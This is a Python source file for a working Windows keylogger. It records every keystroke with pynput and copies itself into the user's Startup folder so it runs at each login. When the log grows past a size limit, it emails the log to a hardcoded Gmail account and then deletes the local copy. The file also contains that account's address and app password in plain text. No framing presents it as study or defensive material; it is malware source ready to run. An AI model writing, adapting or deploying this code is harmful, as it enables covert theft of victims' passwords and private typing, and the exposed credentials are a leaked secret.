from pynput.keyboard import Key, Listener
from datetime import datetime
import os.path
from os import path
import shutil
from mailer import Mailer

keys = []
subject = f'{os.getlogin()}_{datetime.now().strftime("%d_%m_%Y_%H_%M_%S")}'
file_name = subject + '.txt'
write_date = 0 #variabile to understand if a new date needs to be saved
start_up_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % os.getlogin()

if not path.exists(start_up_path + '\KeyLogger'):
    shutil.move(os.getcwd(), start_up_path) #move file to startup folder

def send_mail(subject, file_name):
    sender_mail = 'mutenssj@gmail.com'
    receiver_mail = sender_mail
    pwd = 'yetzdcskhygwabrn'

    mail = Mailer(email = sender_mail, password = pwd)

    mail.settings(multi=True) #allows to send file

    mail.send(receiver = receiver_mail, subject = subject, file = file_name)


def check_file_size():
    global write_date

    if os.stat(file_name).st_size > 12500: #each time the file size exceeds 1mb it will be sent via mail and then deleted
        send_mail(subject, file_name)
        os.remove(file_name)
        write_date = 0


def on_press(key):
    global keys

    if key != Key.space and key != Key.enter:
        keys.append(key)
    else:
        keys.append(key)
        write_file(keys)


def write_file(keys):
    global write_date

    if path.exists(file_name):
        mode = 'a'
    else:
        mode = 'w'

    with open(file_name, mode) as f:
        for key in keys:
            try:
                key = key.char
                if (ord(key) >= 32 and ord(key) <= 126): #only normal characters allowed
                    if write_date == 0:
                        write_date = 1
                        date = datetime.today().strftime("[%d/%m/%Y-%H:%M:%S]: ") #each time a sentence begins, when it begins is saved
                        f.write(date + key)
                    else:
                        f.write(key)
            except AttributeError:
                if key == Key.space:
                    key = ' '
                    f.write(key)
                elif key == Key.enter:
                    key = '\n'
                    f.write(key)
                    write_date = 0
    keys.clear()
    check_file_size()


def on_release(key):
    if key == Key.esc:
        return False #stop the listener


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
